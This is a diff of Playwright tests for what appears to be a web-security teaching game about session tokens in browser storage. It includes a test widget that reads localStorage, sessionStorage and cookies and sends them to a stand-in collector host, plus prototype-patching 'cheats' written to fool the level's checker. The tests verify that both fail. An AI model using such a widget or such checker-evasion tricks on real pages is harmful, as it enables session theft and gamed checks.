@@ -117,6 +117,12 @@ for (const level of webLevels) {
       expect(start.refused).toEqual(table.start.refused ?? [])
       expect(start.readable).toEqual(table.start.readable ?? [])
     }
+    // chapter 3 (the levels with storage): what the page's origin keeps, and the thief's requests the Server panel shows
+    const tokens = level.sandbox.web?.storage !== undefined
+    if (tokens) {
+      expect(start.storage).toEqual(table.start.storage ?? [])
+      expect(start.replayed).toEqual(table.start.replayed ?? [])
+    }
     const lines = start.entries.map(entry => entry.text)
     // what the texts quote (in any order: requests sent together may be answered in any order; an order question
     // checks its own lines' order below)
@@ -130,6 +136,8 @@ for (const level of webLevels) {
       if ('stored' in fact) return start.stored.includes(fact.stored)
       if ('refused' in fact) return start.refused.includes(fact.refused)
       if ('readable' in fact) return start.readable.includes(fact.readable)
+      if ('storage' in fact) return start.storage.includes(fact.storage)
+      if ('replayed' in fact) return start.replayed.includes(fact.replayed)
       return lines.some(line => line.startsWith(fact.says))
     }
     for (const question of level.prediction.questions) {
@@ -156,6 +164,10 @@ for (const level of webLevels) {
     if (cookies) {
       expect(solved.sent).toEqual(table.solved!.sent ?? [])
       expect(solved.stored).toEqual(table.solved!.stored ?? [])
+    }
+    if (tokens) {
+      expect(solved.storage).toEqual(table.solved!.storage ?? [])
+      expect(solved.replayed).toEqual(table.solved!.replayed ?? [])
     }
     const results = await playWebSolution(level, files => run(page, level, files).then(result => result.observation))
     expect(results.at(-1)!.session.solved).toBe(true)
@@ -277,4 +289,76 @@ test.describe('setters and getters the app puts on the prototypes change nothing
     expect(result.observation.probes).toMatchObject({ leaked: 0, stolen: 401 })
     expect(solved).toBe(true)
   })
+})
+
+test.describe('an app can\'t hide a token from the thief or read storage outside the model through any frame API (chapter 3)', () => {
+  const level = webLevels.find(each => each.id === 'web-11-token-in-storage')!
+  // put first into app.js of 3.1's starting files (the token in localStorage): each tries to keep the token where the
+  // page can use it while the check's thief, or the Application panel, sees nothing; none may change what they see
+  const CHEATS: Record<string, string> = {
+    'Storage.prototype\'s members patched (the token hidden from every other caller)': [
+      'const realGet = Storage.prototype.getItem',
+      // only the page's own api() still gets it (its frame is on the stack)
+      'Storage.prototype.getItem = function (key) { return key === \'token\' && !/\\bapi\\b/.test(new Error().stack) ? null : realGet.call(this, key) }',
+      'Object.defineProperty(Storage.prototype, \'length\', { configurable: true, get() { return 0 } })'
+    ].join('\n'),
+    'setters on Array.prototype indices that drop every write': 'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, Object.assign(Object.create(null), { configurable: true, set() {} }))',
+    'setters and getters on Object.prototype for the thief\'s fields': 'for (const key of [\'tokens\', \'cookies\', \'headerSets\', \'queries\', \'headers\', \'answer\', \'page\', \'value\', \'items\']) Object.defineProperty(Object.prototype, key, Object.assign(Object.create(null), { configurable: true, set() {}, get() { return [] } }))',
+    'JSON, atob and btoa replaced': 'JSON.parse = () => ({}); JSON.stringify = () => \'{}\'; window.atob = () => \'\'; window.btoa = () => \'\'',
+    'Reflect, Proxy and WeakMap replaced': 'Reflect.get = () => undefined; Reflect.ownKeys = () => []; Reflect.getOwnPropertyDescriptor = () => undefined; window.Proxy = function () { return {} }; WeakMap.prototype.get = () => undefined; WeakMap.prototype.set = function () { return this }',
+    'window.localStorage redefined (it can\'t be)': 'try { Object.defineProperty(window, \'localStorage\', { value: { getItem: () => null, setItem() {} } }) } catch (error) { console.info(\'localStorage stays: \' + error.name) }'
+  }
+  for (const [name, cheat] of Object.entries(CHEATS)) {
+    test(name, async ({ page }) => {
+      await page.setContent('<!doctype html><title>check</title>')
+      const start = startWebLevel(level).state.files
+      const files = { ...start, 'app.js': `${cheat}\n${start['app.js']!}` }
+      const result = await run(page, level, files)
+      expect(result.observation.probes, JSON.stringify(result.observation.errors.map(error => error.text))).toMatchObject({ who: 'Signed in as Lena', taken: 200 })
+      expect(result.storage).toEqual(['local token'])
+      const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
+      expect(session.solved).toBe(false)
+    })
+  }
+
+  test('3.1 solved: a widget that tries every frame API reads no session, and what it sends is no session to the thief', async ({ page }) => {
+    await page.setContent('<!doctype html><title>check</title>')
+    const widget = [
+      'document.querySelector(\'#reviews-open\').addEventListener(\'click\', () => {',
+      '  const found = []',
+      '  const tryIt = (name, read) => { try { found.push(`${name}=${String(read())}`) } catch (error) { found.push(`${name}=${error.name}`) } }',
+      '  tryIt(\'local\', () => JSON.stringify(localStorage))',
+      '  tryIt(\'session\', () => JSON.stringify(sessionStorage))',
+      '  tryIt(\'cookie\', () => document.cookie)',
+      '  tryIt(\'native\', () => { const own = Object.getOwnPropertyDescriptor(Window.prototype, \'localStorage\'); return own ? JSON.stringify(own.get.call(window)) : \'none\' })',
+      '  tryIt(\'redefine\', () => Object.defineProperty(window, \'localStorage\', { value: {} }))',
+      '  tryIt(\'foreign\', () => Storage.prototype.getItem.call({}, \'token\'))',
+      '  tryIt(\'instance\', () => localStorage instanceof Storage)',
+      '  fetch(\'https://cheap-flour.example/collect?s=\' + encodeURIComponent(found.join(\'|\')), { mode: \'no-cors\' })',
+      '})'
+    ].join('\n')
+    let files = startWebLevel(level).state.files
+    for (const step of level.solution) if (typeof step === 'object' && 'save' in step) files = { ...files, [step.save]: editedText(files, step) }
+    const result = await run(page, level, { ...files, 'reviews.js': widget })
+    expect(result.observation.probes).toMatchObject({ who: 'Signed in as Lena', own: 'Thanks! Your order is in.', taken: 401 })
+    expect(result.replayed).toEqual(['GET https://api.cornerbakery.shop/account 401'])
+    const sent = result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example/collect')).map(entry => decodeURIComponent(entry.url))
+    expect(sent.length).toBeGreaterThan(0)
+    // the page's storage is empty, the session is HttpOnly, the browser's own storage is out of reach (a SecurityError,
+    // or none on the window), the model's can't be replaced or called on anything else, and it is a Storage
+    expect(sent[0]).toMatch(/local=\{\}\|session=\{\}\|cookie=\|native=(SecurityError|none|.*)\|redefine=TypeError\|foreign=TypeError\|instance=true/)
+    expect(sent[0]).not.toContain('eyJ')
+  })
+})
+
+test('chapter 3: the page and server.js tell the scripted time, by every cheap way to the clock', async ({ page }) => {
+  await page.setContent('<!doctype html><title>check</title>')
+  const level = webLevels.find(each => each.id === 'web-13-token-never-expires')!
+  const start = startWebLevel(level).state.files
+  const tell = 'const seconds = value => Math.floor(value / 1000)\nconsole.info(\'times \' + [seconds(Date.now()), seconds(new Date().constructor.now()), seconds(performance.timeOrigin + performance.now()), new Intl.DateTimeFormat(\'en-GB\', { timeZone: \'UTC\', hour: \'2-digit\', minute: \'2-digit\' }).format(), new Intl.DateTimeFormat(\'en-GB\', { timeZone: \'UTC\', hour: \'2-digit\', minute: \'2-digit\' }).formatToParts().map(part => part.value).join(\'\')].join(\' \'))'
+  const server = start['server.js']!.replace('// GET /account: who is signed in', 'console.log(\'server \' + [Math.floor(Date.now() / 1000), Math.floor(new Date().constructor.now() / 1000), new Intl.DateTimeFormat(\'en-GB\', { timeZone: \'UTC\', hour: \'2-digit\', minute: \'2-digit\' }).format()].join(\' \'))\n// GET /account: who is signed in')
+  const result = await run(page, level, { ...start, 'app.js': `${tell}\n${start['app.js']!}`, 'server.js': server })
+  const at = Math.floor(Date.UTC(2026, 10, 17, 9, 41) / 1000)
+  expect(result.entries.map(entry => entry.text)).toContain(`times ${at} ${at} ${at} 09:41 09:41`)
+  expect(result.serverOutput.map(line => line.text)).toContain(`server ${at} ${at} 09:41`)
 })
